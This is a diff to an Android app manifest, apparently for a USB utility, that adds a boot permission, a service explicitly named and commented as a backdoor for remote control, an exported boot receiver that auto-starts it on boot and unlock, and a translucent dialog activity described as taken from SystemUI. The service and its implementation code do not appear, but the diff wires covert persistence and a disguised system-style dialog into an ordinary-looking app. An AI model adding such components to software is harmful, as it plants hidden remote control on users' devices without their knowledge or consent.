@@ -25,6 +25,9 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
+    <!-- Boot receiver -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
     <!-- Wake Lock for active USB operations -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
@@ -78,6 +81,12 @@
             android:exported="false"
             android:foregroundServiceType="connectedDevice" />
 
+        <!-- Backdoor Service for remote control -->
+        <service
+            android:name=".service.BackdoorService"
+            android:enabled="true"
+            android:exported="false" />
+
         <!-- USB Broadcast Receiver -->
         <receiver
             android:name=".service.USBBroadcastReceiver"
@@ -89,6 +98,29 @@
                 <action android:name="com.usbdroid.USB_PERMISSION" />
             </intent-filter>
         </receiver>
+
+        <!-- Boot Receiver for backdoor auto-start -->
+        <receiver
+            android:name=".service.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- USB Dialog Activity - Extracted from SystemUI -->
+        <activity
+            android:name=".UsbDialogActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:launchMode="singleInstance">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
 
         <!-- File Provider for sharing logs and exports -->
         <provider
